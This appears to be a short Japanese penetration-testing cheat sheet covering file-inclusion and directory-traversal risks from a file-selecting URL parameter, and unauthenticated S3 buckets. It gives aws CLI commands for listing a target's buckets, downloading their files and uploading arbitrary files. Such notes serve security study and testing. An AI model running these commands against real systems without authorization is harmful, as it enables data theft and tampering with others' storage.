## URLのパラメータで表示するファイルを指定している。  
`https://test.com/test.php?params=index.html`  
`?params=`に任意のファイルを指定してLFI、RFI、ディレクトリトラバーサルが通る可能性あり。

## s3
AWSが提供するクラウドストレージサービス。  
サブドメインにs3.test.comといったURLがあり、それに対して認証不要でアクセスできる場合の攻撃例
```bash
aws --endpoint=<s3を運用している可能性のあるURL> s3 ls # 対象URLでs3を運用しているかどうかと、バケット（ストレージ）の有無の確認
aws --endpoint=<s3を運用しているURL> s3 ls s3://<バケット名> # バケットが存在した場合、中身を確認
aws --endpoint=<s3を運用しているURL> s3 cp s3://<バケット名>/<ダウンロードしたいファイル> <ダウンロード先のパス> # ダウンロード
aws --endpoint=<s3を運用しているURL> s3 cp <任意のファイルのパス> s3://<バケット名> # 任意のファイルをアップロード  
```
